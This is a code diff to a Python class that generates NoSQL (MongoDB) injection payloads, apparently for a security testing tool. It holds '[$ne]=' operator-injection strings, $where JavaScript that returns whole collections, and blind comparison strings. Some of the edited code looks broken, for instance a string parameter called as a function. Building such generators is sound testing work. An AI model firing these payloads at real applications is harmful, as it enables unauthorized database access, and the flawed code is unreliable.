@@ -46,18 +46,18 @@ class InjectionStringCreator:
         for st in itertools.product(self.sizes, self.formats):
             yield "%s" %(randInjString(st[0], st[1]))
 
-    def createNeqString(self):
-        for st in itertools.product(self.sizes, self.formats):
-            yield "%s%s" %("[$ne]=",randInjString(st[0], st[1]))
+    def makeNeqString(self, origString):
+        return "%s%s" %("[$ne]=",origString)
 
-    def createWhereStrString(self):
+    def makeWhereString(self, injString):
         informations = [
-            "return db.a.find();",
-            "return db.a.findOne();",
+            "return db.%s.find();",
+            "return db.%s.findOne();",
         ]
 
         for st in itertools.product(self.leftPart, informations, self.rightPart):
-            yield "%s%s%s" % (st[0],st[1],st[2])
+            central = st[1] %(injString)
+            yield "%s%s%s" % (st[0],central,st[2])
 
     def createTimeString(self):
         informations = [
@@ -66,15 +66,15 @@ class InjectionStringCreator:
         for st in itertools.product(self.leftPart, informations, self.rightPart):
             yield "%s%s%s" %(st[0],st[1],st[2])
 
-    def createBlindNeqString(self):
+    def createBlindNeqString(self, injString):
         informations = [
-            "return this.a!='",
-            "return this.a!=\"",
+            "return this.%s!='",
+            "return this.%s!=\"",
         ]
-
+        randCentral = rand(injString(5,2))
         for st in itertools.product(self.leftPart, informations, self.rightPart):
-            for st2 in itertools.product(self.sizes, self,formats):
-                yield "%s%s%s%s" %(st[0],st[1],randInjString(st2[0], st2[1]),st[2])
+            central = st[1] %(randCentral)
+            yield "%s%s%s%s" %(st[0],central,injString,st[2])
 
         #return "=a'; return this.a != '" + randInjString(size, formatStringString) + "'; var dummy='!"
 
